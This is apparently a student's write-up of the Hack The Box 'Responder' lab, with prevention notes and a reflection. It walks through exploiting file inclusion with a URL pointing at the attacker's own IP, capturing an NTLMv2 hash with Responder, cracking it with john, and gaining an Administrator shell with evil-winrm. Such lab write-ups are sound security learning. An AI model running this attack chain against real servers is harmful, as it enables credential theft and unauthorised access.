# Responder

## What HTB wants you to learn:

How File Inclusion Vulnerability can be exploited to capture NTLMv2 password hash and  gain remote access to a server.

## What I did: 

1. ran: ping 'ip addr' to test if the server was reachable. 
2. ran: nmap -Pn 'ip addr' to scan the target and discover open ports and services running on the ports.
Discovered port 80 (http) and port 5985 (wsman)

![nmap scan](responder/images/scan_result.png)

4. connected to the target ip addr with my browser. 
 Note: I could not access unika.htb through the ip address. Added the ip addr and hostname to /etc/hosts to resolve the issue.
 Ip addr got resolved to the hostname (unika.htb).
5. Viewed the page source to discover the possible programing language (php). 
6. changed the display language to german. Url: "http://unika.htb/index.php?page=german.html". Identified the "page".
7. ran: responder --help. Needed flags -I (Interface) and -v (verbose). 
   ran: sudo responder -I tun0 -v , to listen for broadcasts on the network. Responder needs super user privilege to run.
Note: I was on NAT, Responder was listening without capturing, had to switch my Network adapter to Bridged. 
8. Performed File Inclusion on my browser by: 
modifying "http://unika.htb/index.php?page=german.html" to "http://unika.htb/index.php?page=//'my_tun0_ip_addr'/hello". Access was denied and an error.
9. Responder successfully captured the NTLMv2 hash. I saved the hash to nthash.hash using: echo "'hash'" > nthash.hash

![NTLMv2 hash](responder/images/res_listening.png)

10. ran: john --help. Needed flags: --format (netntlmv2) and --wordlist (rockyou.txt).
11. ran: john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt nthash.hash
The hash got cracked and I obtained "badminton" as the Administrator password.

![cracked password](responder/images/password_obt.png)

12. ran: evil-winrm --help. Needed flags: -i (ip addr) -u (username) -P (port) -p (password). 
ran: evil-winrm -i "target ip addr" -u Administrator -P 5985 -p badminton
13. Successfully connected to the target system and got terminal access. 

![access gained](responder/images/access.png)

14. Navigated to mike (user) directory and got the flag using the following commands: ls, cd and cat.

## Why it worked:

- The target server is vulnerable to File Inclusion by not sanitizing user input.
- port 5985 running wsman was open
- the Administrator password exits in a password breach.
- I was on the same network with the target server.

## Prevention

The web application should:
- sanitize user input
- disable Remote Inclusion (prevents loading external files)

## Reflection

I didn't realize how easy it was to capture an NTLMv2 hash just from
a Remote File Inclusion vulnerability, exploiting one flaw led
straight into a completely different attack surface. It also raised
a question I want to dig into further: why does a request like this
get broadcast on the network in the first place, rather than staying
contained to the server?

The other thing that stood out was how little the Administrator's
password length actually mattered once the hash was captured. It was
long, but it was a common word already in a breach dictionary, and
john cracked it in seconds. Length alone doesn't protect a password
if it's not actually unique.
